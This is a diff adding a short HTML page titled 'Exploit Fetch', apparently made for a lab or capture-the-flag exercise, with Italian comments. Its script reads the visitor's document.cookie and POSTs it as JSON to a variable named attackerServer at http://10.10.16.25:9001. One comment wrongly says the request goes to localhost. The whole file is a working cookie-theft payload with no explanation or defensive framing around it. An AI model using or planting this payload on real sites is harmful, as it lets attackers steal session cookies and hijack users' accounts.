@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit Fetch</title>
+</head>
+<body>
+    <script>
+        // URL del server per ricevere i dati
+        const attackerServer = "http://10.10.16.25:9001";
+
+        // Esegue una fetch a localhost
+        fetch(attackerServer, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+
+                    },
+                    body: JSON.stringify({
+                        data: document.cookie
+                    })
+                });
+    </script>
+</body>
+</html>
